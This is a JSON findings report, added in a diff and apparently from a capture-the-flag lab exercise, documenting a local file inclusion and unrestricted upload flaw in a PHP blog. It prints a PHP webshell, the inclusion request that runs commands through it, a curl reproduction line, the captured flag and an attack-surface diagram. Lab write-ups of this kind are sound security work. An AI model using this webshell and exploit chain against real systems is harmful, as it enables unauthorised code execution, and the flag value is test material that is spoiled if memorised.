@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:42:31.134234+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f6d18674-4c68-4321-9f46-c1193164c457",
+      "timestamp": "2026-04-12T21:42:31.133799+00:00",
+      "title": "CTF Flag Extracted via LFI + Unrestricted File Upload (RCE)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:41843",
+      "description": "The application has a Local File Inclusion vulnerability in post.php (id parameter). The LFI protection blocks path traversal using '..' but allows subdirectory references without dots. Combined with an unrestricted file upload endpoint at /posts/upload-article.php that saves PHP files to /posts/uploads/ (static-served but LFI-executable), a webshell can be uploaded and then included via LFI to achieve Remote Code Execution. This was used to read /FLAG.txt and extract the CTF flag.",
+      "evidence": "Flag: flag{57d18e72-c3df-45e3-9cc0-119fddf1b28e}\n\nExploit chain:\n1. POST /posts/upload-article.php with PHP webshell (<?php system($_GET['cmd']); ?>) saved to /posts/uploads/webshell.php\n2. GET /post.php?id=uploads/webshell&cmd=cat+/FLAG.txt -> RCE as www-data\n3. Output: flag{57d18e72-c3df-45e3-9cc0-119fddf1b28e}",
+      "tool_used": "manual",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s 'http://172.17.0.1:41843/post.php?id=uploads/webshell&cmd=cat+/FLAG.txt'",
+        "expected": "flag{57d18e72-c3df-45e3-9cc0-119fddf1b28e}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "72186690-f3a7-4a56-93fb-ee3c9abb150d",
+      "timestamp": "2026-04-12T21:42:47.122010+00:00",
+      "title": "Encoder64 Blog Attack Surface",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> PostPHP[\"post.php?id= (LFI endpoint)\"]\n  Attacker --> UploadPHP[\"posts/upload-article.php (File Upload)\"]\n  PostPHP --> PostsDir[\"posts/ directory (PHP includes)\"]\n  PostsDir --> UploadsDir[\"posts/uploads/ (uploaded files - static served)\"]\n  UploadPHP --> UploadsDir\n  PostPHP -- \"id=uploads/webshell&cmd=\" --> UploadsDir\n  UploadsDir -- \"PHP execute via include()\" --> RCE[\"RCE as www-data\"]\n  RCE --> FlagFile[\"/FLAG.txt - flag found\"]"
+    }
+  ]
+}
